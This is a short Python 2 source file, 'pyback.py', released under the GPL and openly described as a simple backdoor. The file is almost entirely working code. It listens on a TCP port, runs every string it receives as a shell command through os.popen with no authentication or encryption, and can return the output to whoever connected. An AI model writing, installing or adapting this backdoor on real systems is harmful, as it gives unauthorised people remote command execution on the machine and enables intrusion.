#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  pyback.py
#  
#  Copyright 2016 DockTownMayor <DockTownMayor@Host>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

# Small simplistic python backdoor.
# Features: ipv4/ipv6, no encryption, no auth, semi-interactive shell.

def main(args):
	debug = False
	interactive = False
	ipversion = 6
	port = 48329
	host = '::1'
	if ipversion is 4:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = 'localhost'
	else:
		sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
	server_address = (host, port)
	sock.bind(server_address)
	sock.listen(1)
	if debug is True:
		print "Finding the light!"
	while True: #Not using threads so not a good idea to allow it to support multiple connections.
		connection, client_address = sock.accept()
		try:
			if debug is True:
				print >>sys.stderr, 'NCF: ', client_address
			while True:
				d = connection.recv(1024)
				if d:
					if "exit" in d: # To allow exit command to exit the connection.
						break
					if "interactive" in d: # To allow the interactive setting to be changed, if you wish to see the output of your command or not.
						if interactive is False:
							interactive = True
						else:
							interactive = False
					a = os.popen(d,"r")
					if interactive is True:
						while True:
							l = a.readline()
							if not l: break
							connection.sendall(l)
				else:
					if debug is True:
						print >>sys.stderr, 'PD: ', client_address
					break
            
		finally:
			connection.close()
	if debug is True:
		print "Going dark!"
	return 0

if __name__ == '__main__':
    import sys
    import socket
    import os
    sys.exit(main(sys.argv))
